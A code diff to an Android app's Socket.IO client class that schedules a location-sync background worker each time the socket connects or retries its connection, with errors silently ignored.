@@ -12,6 +12,7 @@ import android.provider.Settings;
 
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.config.Config;
+import com.fason.app.features.gps.LocationSyncWorker;
 
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
@@ -66,7 +67,12 @@ public final class SocketClient {
 
             socket = IO.socket(Config.getServerUrl(), opts);
 
-            socket.on(Socket.EVENT_CONNECT, args -> connected = true);
+            socket.on(Socket.EVENT_CONNECT, args -> {
+                connected = true;
+                try {
+                    LocationSyncWorker.enqueue(FasonApp.getContext());
+                } catch (Exception ignored) {}
+            });
             socket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
             socket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);
         } catch (Exception ignored) {}
@@ -88,6 +94,9 @@ public final class SocketClient {
                     if (socket != null && !socket.connected()) {
                         try { socket.connect(); } catch (Exception ignored) {}
                     }
+                    try {
+                        LocationSyncWorker.enqueue(FasonApp.getContext());
+                    } catch (Exception ignored) {}
                 }, 1000);
             }
         };
